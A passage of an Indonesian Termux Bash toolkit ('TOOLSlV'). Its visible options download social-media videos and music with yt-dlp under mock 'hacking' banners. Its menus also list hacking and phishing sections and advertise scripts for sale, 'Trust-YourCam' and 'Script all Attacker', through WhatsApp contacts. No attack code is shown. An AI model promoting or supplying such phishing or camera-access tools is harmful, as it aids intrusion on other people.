  echo -e "${bold_bg}${bold_gren} ANDA MEMILIH BUY SC TRUST-YOURCAM.${n}"
  sleep 3 
  clear
  mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
  sleep 1
  mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
  echo ""
  echo -e "${g} Apakah anda ingin melihat tampilan scnya? "
  echo -e "${g} Pada video tersebut? "
  echo -e "${p}"
  read -p "Apakah anda ingin melihat video tersebut? (y/n) : " cok
  echo ""
  if [ "$cok" = "y" ] || [ "$cok" = "Y" ]; then
      gambar "https://h.top4top.io/m_3780t3n031.mp4"
      echo -e "${g}Membuka video ke halaman web."
      sleep 2
  elif [ "$cok" = "n" ] || [ "$cok" = "N" ]; then
      echo ""
      echo -e "${r}Lewati melihat video."
  else
      echo ""
      echo -e "${y}Masukkan y atau n saja."
  fi  
  clear
  echo ""
  echo -e "${y}=========================================${n}"
  echo -e "${g}  Apakah anda ingin membuka Owner?${n}"
  echo -e "${y}=========================================${n}"
  echo -e "${c}"
  read -p "Buka WhatsApp sekarang? (y/n) : " wa  
  if [[ "$wa" = "y" || "$wa" = "Y" ]]; then
      pesan="Assalamualaikum bang. Apakah masih ada sc Trust-YourCamnya?
> _Buyer ToolslV_"
      wea "6285731184377" "$pesan"
      echo -e "${g}✓ Membuka WhatsApp."
  else
      echo -e "${r}✗ Dibatalkan."
  fi
  sleep 2
  clear
elif [[ "$input" = "buy4" || "$input" = "BUY4" ]]; then
  clear
  echo -e "${bold_bg}${bold_gren} ANDA MEMILIH BUY SC ALL ATTACKER.${n}"
  sleep 3 
  clear
  mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
  sleep 1
  mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
  echo ""
  echo -e "${g} Apakah anda ingin melihat tampilan scnya? "
  echo -e "${g} Pada gambar tersebut? "
  echo -e "${p}"
  read -p "Apakah anda ingin melihat gambar tersebut? (y/n) : " cok
  echo ""
  if [ "$cok" = "y" ] || [ "$cok" = "Y" ]; then
      gambar "https://e.top4top.io/p_3842rwu6h1.jpg"
      echo -e "${g}Membuka gambar ke halaman web."
      sleep 2
  elif [ "$cok" = "n" ] || [ "$cok" = "N" ]; then
      echo ""
      echo -e "${r}Lewati melihat gambar."
  else
      echo ""
      echo -e "${y}Masukkan y atau n saja."
  fi  
  clear
  echo ""
  echo -e "${y}=========================================${n}"
  echo -e "${g}  Apakah anda ingin membuka Owner?${n}"
  echo -e "${y}=========================================${n}"
  echo -e "${c}"
  read -p "Buka WhatsApp sekarang? (y/n) : " wa  
  if [[ "$wa" = "y" || "$wa" = "Y" ]]; then
      pesan="Assalamualaikum bang. Apakah masih ada Script all Attackernya?
> _Buyer ToolslV_"
      wea "6289508899033" "$pesan"
      echo -e "${g}✓ Membuka WhatsApp."
  else
      echo -e "${r}✗ Dibatalkan."
  fi
  sleep 2
  clear
elif [[ "$input" = "bk" || "$input" = "BK" ]]; then
  clear
  echo ""
  echo -e "${r}Kembali ke TOOLSlV"
  echo ""
fi
}
KOSONG() {
clear 
echo ""
mpv --no-video --quiet "$HOME/Yalakan/salah.mp3" &> /dev/null &
echo -e "${bold_bg}${green} PILIHAN ANDA TIDAK VALID..!!${n}"
echo ""
sleep 3
clear 
echo ""
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
echo -e "${r}         ⛔ PERINGATAN ⛔ "
echo ""
echo -e "${c}  PILIHAN BAGIAN NOMER ${r}[ ${g}94${r} ]"
echo -e "${c}  AGAR BISA KEMBALI LAGI KE MENU AWAL"
echo -e "${c}  JIKA ANDA TIDAK SENGAJA MEMILIH MENU"
echo -e "${c}  YANG TIDAK FALID ATUPUN TIDAK ADA DI"
echo -e "${y}  TOOLSlV INI..!!"
echo ""
}
version=$(python --version 2>&1 | awk '{print $2}')
main_menu() {
grep=$(python3 -c "
import os, re
ps1 = os.environ.get('PS1', '')
m = re.search(r'≼([^•~]+)', ps1)
if not m:
    for f in ['/data/data/com.termux/files/usr/etc/bash.bashrc', os.path.expanduser('~/.bashrc')]:
        if os.path.exists(f):
            with open(f) as x:
                c = x.read()
                m = re.search(r'\[\]([^\[\]]+)\[\]', c) or re.search(r'≼([^•~]+)', c)
                if m:
                    break
print(m.group(1) if m else os.popen('whoami').read().strip() + '@localhost')
")
dancok=$(echo "$grep" | sed -E 's/;[0-9]+m//g' | tr -d '[]\\')
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/klik.mp3" &> /dev/null &
echo -e "${c}
░██ ░██    ░██ 
░██ ░██    ░██ 
░██ ░██    ░██ 
░██ ░██    ░██ 
░██  ░██  ░██  
░██   ░██░██   
░██    ░███ "
echo ""
echo -e "${g}========================="
echo -e "${p}       NOTIFIKASI " 
echo -e "${g}========================="
echo -e "$w➜ Developer : ${bold_bg}${bold_gren} Thxyzz404 ${n} "
echo -e "$w➜ Host : $dancok "
echo -e "$w➜ Hallo : $usr 👋 "
echo -e "$w➜ Skrg hari : $ucapan "
echo -e "$w➜ Skrg tanggal : $tanggal "
echo -e "$w➜ Skrg bulan : $bulan "
echo -e "$w➜ Selamat : $sambutan "
echo -e "$w➜ Python-Version : $version "
echo -e "$w➜ Rilis : 17 / 12 / 2024 "
echo -e "$w➜ Jumlah pengguna ${c}:${y} $whoami "
echo -e "$w➜ QR donasi admin 👇👇 "
echo -e "${r}Link ${y}:${c} https://j.top4top.io/p_3812kyzmd1.jpg "
echo ""
echo -e  "\033[1;30m╔══════════════════════════════════════╗"
echo -e  "\033[1;30m║      ${bold_bg}${bold_gren} LEMARI TOOLS ADA DIBAWAH ${n}\033[1;30m      ║${n}"
echo -e  "\033[1;30m╠══════════════════════════════════════╣"
echo -e  "\033[1;30m║${r} [${g} AL ${r}]${c} MENU HACKING MEDIA            \033[1;30m║"
echo -e  "\033[1;30m║${r} [${g} PS ${r}]${c} MENU PSHING MEDIA             \033[1;30m║"
echo -e  "\033[1;30m║${r} [${g} DO ${r}]${c} MENU DOWNLOAD MEDIA           \033[1;30m║"
echo -e  "\033[1;30m║${r} [${g} EN ${r}]${c} MENU ENCRIPSY CODER FILE      \033[1;30m║"
echo -e  "\033[1;30m║${r} [${g} TM ${r}]${c} MENU SC+ TAMBAHAN             \033[1;30m║"
echo -e  "\033[1;30m║${r} [${g} DK ${r}]${c} MENU PRODAK SC                \033[1;30m║"
echo -e  "\033[1;30m╚══════════════════════════════════════╝"
echo ""
read -p "$(echo -e "${b}❯❯❯ ${y}Masukkan pilihan anda ${r}[ ${g}TOOLSlV ${r}]${c} : ")" thxyzz404
echo ""
if [[ "$thxyzz404" = "al" || "$thxyzz404" = "AL" ]]; then
  clear
  ALL
elif [[ "$thxyzz404" = "do" || "$thxyzz404" = "DO" ]]; then
  clear
  DOWN
elif [[ "$thxyzz404" = "ps" || "$thxyzz404" = "PS" ]]; then
  clear
  PSHG
elif [[ "$thxyzz404" = "en" || "$thxyzz404" = "EN" ]]; then
  clear
  ENC
elif [[ "$thxyzz404" = "tm" || "$thxyzz404" = "TM" ]]; then
  clear
  TMBH
elif [[ "$thxyzz404" = "dk" || "$thxyzz404" = "DK" ]]; then
  clear
  PRODAK
else
  clear
  KOSONG
fi
}
while true; do
main_menu
echo -e "$w╔═════════════════════════════════════════════╗"
echo -e "$w║           ${bold_bg}${bold_gren}  PENGATURAN TOOLSlV  ${n}         $w   ║${n}"
echo -e "$w╠═════════════════════════════════════════════╣"
echo -e "$w║${c}╰┈➤ ${y}[91]◉ ${g}[ ${c}Laporkan__BUGS${g} ]              $w   ║"
echo -e "$w║${c}╰┈➤ ${r}[${y}92${r}]${c}◉ ${y}[ MANAGER SETTING SOUND ]         $w ║"
echo -e "$w║${c}╰┈➤ ${y}[93]◉ ${g}[ Pemberitahuan ]             $w     ║"
echo -e "$w║${c}╰┈➤ ${y}[94]◉ ${r}[ ${y}KEMBALI KE MENU AWAL ${r}]      $w     ║"
echo -e "$w║${c}╰┈➤ ${y}[95]◉ ${g}[ Keluar ]                       $w  ║"
echo -e "$w║${c}╰┈➤ ${y}[96]◉ ${g}[ ${c}Pembersihan${g} ]                 $w   ║"
echo -e "$w╚═════════════════════════════════════════════╝"
echo ""
read -p "$(echo -e "${b}❯❯❯ ${y}Masukkan pilihan anda ${r}[ ${g}TOOLSlV ${r}]${c} : ")" apa_babi
echo ""
case $apa_babi in
       70)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
DIR="/sdcard/Download"
echo "
⠀⠀⠀⣠⣴⡶⣿⢿⣻⣟⡿⣟⣿⣻⢿⣻⣟⡿⣟⣿⣻⢿⣻⢿⡶⣦⣀⠀⠀⠀
⠀⣠⡾⣟⣾⡽⠟⠛⠛⠚⠙⠋⠓⠋⠛⠙⠚⠙⠋⠓⠛⠛⠛⠯⢿⣽⣻⣷⡄⠀
⣰⡿⣽⠿⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣠⣤⡀⠘⢿⣞⣿⣂
⣿⢿⣽⠃⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣄⣠⣠⡀⡀⠀⠀⣾⢿⣽⣻⠄⢈⣿⡷⣿
⣿⣻⣾⠄⠀⠀⠀⠀⠀⣠⣶⣟⣯⡿⣽⣻⣽⣟⡿⣶⣄⠉⠛⠊⠃⠀⠨⣿⣽⢿
⣿⣳⣯⠀⠀⠀⠀⢀⣼⣟⣾⡽⠃⠉⠁⠁⠈⠙⢻⡷⣟⣧⠀⠀⠀⠀⠀⣿⢾⣻
⣿⣳⣯⠀⠀⠀⠀⣼⣟⣾⡍⠀⠀⠀⠀⠀⠀⠀⠀⢹⡿⣽⣧⠀⠀⠀⠀⣯⢿⣻
⣿⣳⣯⠀⠀⠀⠀⣻⣽⣾⡀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣟⣿⣎⠀⠀⠀⠀⣻⡿⣽
⣿⣳⣯⠀⠀⠀⠀⢻⣟⣾⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣟⡷⡿⠀⠀⠀⠀⣿⡽⣿
⣿⣳⣯⠀⠀⠀⠀⠈⢻⣾⡽⣷⣄⣀⠀⢀⣀⣠⣾⣟⣾⡟⠁⠀⠀⠀⠀⣷⣟⣿
⣿⣳⣿⠂⠀⠀⠀⠀⠀⠑⠻⣯⣟⡿⣿⣻⣟⣯⣷⠻⠊⠀⠀⠀⠀⠀⢐⣿⡾⣽
⣿⣷⣻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠃⠙⠛⠈⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣻⣽
⠹⣾⣽⣳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⢯⣷⠏
⠀⠘⢷⣯⣟⡷⣦⣤⡴⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣴⣦⣤⣴⣾⢷⣯⡿⠃⠀
⠀⠀⠀⠈⠻⠽⣳⣯⣟⡿⣞⣷⣻⣞⣷⣻⣞⣷⣻⣞⣷⢯⣿⣽⠾⠟⠈
" | lolcat
echo -e "${p}Development ${c}: ${g}Thxyzz404"
echo -e "${c}"
read -p "Masukkan URL Instagram : " url
echo ""
echo -e "${r}[ ${g}+ ${r}]${g} Mengunduh Video Dari Instagram..!!"
echo -e "${n}"
yt-dlp -o "${DIR}/%(title).80s.%(ext)s" "$url"
if [ $? -eq 0 ]; then
    echo ""
    echo -e "${y}Sukses! Video Disimpan Di :${r} ${DIR}"
    echo ""
else
    echo ""
    echo -e "${r}Gagall mengunduh. Periksa URL atau koneksi internet Anda."
    echo ""
fi
  echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
  read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
  clear
    ;;
       71)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
DIR="/storage/emulated/0/Download"
echo ""
echo "
⠀⠀⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢹⣷⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠸⣿⣿⣷⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣶⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀⠀⠀⠀⠀
⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣯⠛⠛⠿⣿⣿⣿⣿⣧⡀⠀
⠀⠀⠀⠀⢹⣿⣿⣿⡀⠀⠀⠀⠙⢿⣿⣿⣧⠀
⠀⠀⠀⠀⠸⣿⣿⣿⣇⠀⠀⠀⠀⠀⠙⣿⣿⡆
⠀⠀⠀⠀⠀⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠈⢻⣇
⠀⠀⠀⠀⠀⢸⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠈⠿
⠀⠀⠀⠀⠀⠘⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣀⣸⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀
⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠙⠛⠿⠿⠿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat
echo ""
echo -e "${g}================================"
echo -e "${r}  Creator ${p}: ${c}Thxyzz404"
echo -e "${r}  Alat ${p}: ${c}Download Musik"
echo -e "${g}================================"
echo ""
read -p "$(echo -e "${y}Masukkan URL Yt ${r}[ ${g}URL ${r}]${n} : ")" yt
echo ""
if [[ -z "$yt" ]]; then
    echo -e "${r}[ ${g}!! ${r}]${c} Link Tidak Boleh Kosong..!!"
    sleep 2
fi
echo ""
echo -e "${r}[ ${g}+ ${r}]${g} Mendownload Musik Dan Mengonversi Ke ${r}[ ${c}MP3 ${r}]"
echo -e "${n}"
yt-dlp \
    --extract-audio \
    --audio-format mp3 \
    --audio-quality 0 \
    --output "${DIR}/%(title)s.%(ext)s" \
    "$yt"
if [[ $? -eq 0 ]]; then
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${g} Musik Berhasill Di Download Ke ${c}:${r} $DIR"
    sleep 4 
    echo ""
else
    echo ""
    echo -e "${r}[ ${g}!! ${r}] Gagall Mendownload Dari YouTube..!!"
    echo ""
fi
  echo ""
  echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
  read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
  clear
     ;;
        72) 
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
echo "
████████▀▀▀████
████████────▀██
████████──█▄──█
███▀▀▀██──█████
█▀──▄▄██──█████
█──█████──█████
█▄──▀▀▀──▄█████
███▄▄▄▄▄███████
" | lolcat
echo -e "${p}Development ${c}: ${g}Thxyzz404"
echo ""
read -p "$(echo -e "${y}Masukkan URL TikTok ${r}[ ${g}URL ${r}]${n} : ")" url
target="/storage/emulated/0/Download"
if [ ! -d "$target" ]; then
  echo ""
  echo -e "${r}[ ${g}!! ${r}]${g} Folder Download Di SD Card Tidak Ditemukan..!!"
fi
echo ""
echo -e "${r}[ ${g}+ ${r}]${c} Mendownload Video Tiktok..!!"
echo -e "${n}"
yt-dlp -o "$target/%(title).50s.%(ext)s" "$url" --no-playlist || {
echo ""
echo -e "${r}[ ${g}!! ${r}]${y} Gagall Mendownload Video Tiktok. Periksa URL TikTok Anda..!!"
}
echo ""
echo -e "${r}[ ${g}✓ ${r}]${g} Video Berhasill Di Download Ke File ${c}:${r} $target"
      echo ""
              echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
              read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
              clear
               ;;
       73)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⡴⠦⢤⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠻⣯⣤⡶⠞⠛⢻⣿⡧⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣿⠀⠀⠸⣿⣤⡤⠶⠾⢿⣇⣀⡤⠉⢻⣦⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡴⠶⠚⡏⠉⠹⣄⡀⢠⣏⢀⣠⣤⠆⠀⠉⠁⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣤⠶⢞⣛⣉⣁⠀⠸⠿⠿⠀⠀⢈⠙⠛⢛⣉⡡⠤⠤⠤⢤⣄⣀⡀⠀⣿⠀⠀⠀⠀⠀⠀⠀
⠀⣠⠞⠋⠀⠀⠿⠿⠿⠿⠁⠀⢀⣤⠶⠛⢉⣴⠞⠉⠀⠀⠀⣀⣤⣴⠶⠿⠿⣿⣿⣆⠀⠀⠀⠀⠀⠀
⢰⡇⠀⠚⠛⠒⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣴⠿⠋⠁⠀⠀⣠⣴⠶⠛⠛⠛⠛⠶⣦⡀⠀
⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠃⠀⠀⠀⢠⣾⠋⠀⠀⠀⣠⡾⠋⣠⣴⣿⣿⣿⣷⣄⠘⣷⠀
⣿⠇⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⠀⣸⡏⠀⠀⠀⢀⣿⠃⠀⠀⠀⣴⠏⠀⣴⣿⣿⠟⠛⣿⣿⣿⡄⢸⡇
⣿⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⣿⠀⠀⠀⠀⣾⡟⠀⠀⠀⢰⠇⠀⣼⣿⣿⣇⣠⣾⣿⣿⣿⡇⢸⡇
⢻⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⣿⠀⠀⠀⠀⣿⠇⠀⠀⠀⡿⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢸⡇
⢸⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⢿⡀⠀⠀⠀⣿⠀⠀⠀⢸⡇⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣾⠁
⠘⠂⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⠘⢷⡀⠀⠀⢿⡆⠀⠀⠸⣧⠀⢸⣿⣿⣿⠟⠻⣿⣿⠟⠀⣼⡏⠀
⢀⠀⠀⣰⣶⡀⠀⠀⢻⡇⠀⠀⠀⠀⠈⠳⣤⣀⣘⣷⡀⠀⠀⢻⡄⠀⠻⣿⣿⣿⣾⠟⠋⢀⣾⠟⠀⠀
⠸⣇⠀⠘⠿⠟⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠈⠙⣻⣿⣿⣷⣦⣬⣿⣦⣀⣀⠉⢁⣀⣤⣴⠟⠁⠀⠀⠀
⠀⣿⣆⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⣠⣴⠾⠛⠉⠁⠀⠀⠈⠉⠛⠻⠿⠿⠿⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠘⢿⣷⣄⡀⠀⠀⠀⠀⠀⠀⣀⣴⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠙⠻⠿⣿⣶⣶⣶⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat 
echo ""
echo -e "${r}╔════════════════════════════════════════════╗"
echo -e "${r}║ ${g} 🚀 Snack Video Downloader For Termux 🚀   ${r}║"
echo -e "${r}╚════════════════════════════════════════════╝"
echo -e "${p}Development ${c}: ${g}Thxyzz404"
echo -e "${c}"
read -p "🔗 Masukkan URL Snack : " url
if [[ ! $url =~ ^https:\/\/s\.snackvideo\.com\/p\/.* ]]; then
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${p} URL tidak valid. Harus dimulai dengan : https://s.snackvideo.com/p/xxx"
    echo ""
fi
echo -e "${g}"
read -p "📁 Masukkan nama folder tujuan [ contoh : Download ] : " folder
output="/storage/emulated/0/$folder"
if [ ! -d "$output" ]; then
    mkdir -p "$output"
    if [ $? -ne 0 ]; then
        echo ""
        echo -e "${r}[ ${g}+ ${r}]${p} Gagall membuat folder tujuan. Pastikan izin storage sudah diberikan."
        echo ""
    fi
fi
echo -e "${y}⏬ Mohon bersabar sedang mendownload : $output${n}"
yt-dlp "$url" -o "$output/%(title)s.%(ext)s"
if [ $? -ne 0 ]; then
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${p} Gagall mendownload video. Pastikan URL valid dan koneksi stabil."
    echo ""
fi
clear
echo ""
echo -e "${g}✅ Download selesai silakan cek folder anda di : $output"
sleep 5
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
   ;;
       74)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
banner() {
    clear
    echo "
⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣶⣶⣶⣶⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀
⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀
⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠙⠿⠿⠛⠉⣠⣾⣿⣿⣿⣿⣿⡆
⢸⣿⣿⣿⣿⣿⣿⠟⠁⢀⣠⣄⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⡇
⠈⣿⣿⣿⣿⣟⣥⣶⣾⣿⣿⣿⣷⣦⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁
⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀
⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀
⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢸⡿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat 
}
down() {
    echo -e "${p}Development ${c}: ${g}Thxyzz404"
    echo -e "${g}"
    read -p "Masukkan URL Facebook : " url
    echo -e "${r}"
    read -p "Masukkan tujuan [ contoh : /sdcard/Download ] : " folder
    if [[ -z "$url" || -z "$folder" ]]; then
        echo ""
        echo -e "${r}[ ${g}+ ${r}]${p} URL atau folder tidak boleh kosong..!!"
        echo ""
    fi
    final=$(curl -Ls -o /dev/null -w "%{url_effective}" "$url")
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${g} Mendownload video dari Facebook..!!${n}"
    echo ""
    yt-dlp -o "$folder/%(title)s.%(ext)s" "$final"
    if [[ $? -eq 0 ]]; then
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${c} Video berhasil didownload ke : $folder "
        echo ""
    else
        echo ""
        echo -e "${r} Gagall Mendownload Video..!!"
        echo ""
    fi
}
banner
down
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
      75)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
n='\033[0m'
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣷⠀⠀⢠⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⡇⠀⣸⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⢿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀
⠀⣠⣶⣦⡀⠹⣿⣿⣿⣿⡿⠁⠀⠘⣿⣿⣿⣿⣿⠇⣠⣴⣶⡄⠀
⢰⣿⣿⣿⣿⣆⠉⠛⠛⠋⠁⣀⣀⣀⠈⠛⠛⠛⠁⣼⣿⣿⣿⣿⡀
⢸⣿⣿⣿⣿⣿⡆⠀⢀⣴⣿⣿⣿⣿⣿⣦⠀⠀⢸⣿⣿⣿⣿⣿⡇
⠈⢿⣿⣿⣿⣿⠃⣠⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⢸⣿⣿⣿⣿⠟⠀
⠀⠀⠉⠙⠋⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣍⠛⠋⠁⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀
⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⡿⠿⢿⣿⣿⣿⣿⡿⠛⠁
" | lolcat
echo -e "${g}===============${r} TIKTOK ALL DOWN ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING..!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading..!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading..!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://www.tikwm.com"
echo ""
echo -e "${g} SELESAI MEMBUKA WATERMARK ALL URL LINK..!!"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
